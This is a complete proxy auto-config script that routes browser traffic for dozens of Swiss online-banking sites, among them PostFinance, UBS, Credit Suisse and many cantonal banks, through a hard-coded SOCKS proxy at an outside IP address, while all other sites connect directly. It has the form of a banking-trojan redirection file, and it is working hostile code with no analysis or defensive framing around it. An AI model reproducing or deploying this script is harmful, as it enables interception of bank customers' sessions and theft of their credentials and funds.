function FindProxyForURL(url, host){
  var proxy = "SOCKS 5.34.183.158:80;";
  var hosts = new Array('*.postfinance.ch', 'cs.directnet.com', 'eb.akb.ch', '*.ubs.com', 
  'tb.raiffeisendirect.ch', '*.bkb.ch', 'inba.lukb.ch', '*.zkb.ch', '*.onba.ch', 
  'e-banking.gkb.ch', '*.bekb.ch', 'wwwsec.ebanking.zugerkb.ch', 'netbanking.bcge.ch', 
  '*.raiffeisen.ch', '*.credit-suisse.com', '*.static-ubs.com', '*.clientis.ch', 
  'clientis.ch', '*bcvs.ch', '*.cic.ch', 'cic.ch', '*baloise.ch', 'ukb.ch', '*.ukb.ch', 
  'urkb.ch', '*.urkb.ch', '*.eek.ch', '*szkb.ch', '*shkb.ch', '*glkb.ch', '*nkb.ch', 
  '*owkb.ch', '*cash.ch', '*bcf.ch');
  for (var i = 0; i < hosts.length; i ++ ){
    if (shExpMatch(host, hosts[i])){
      return proxy
    }
  }
  return "DIRECT"
}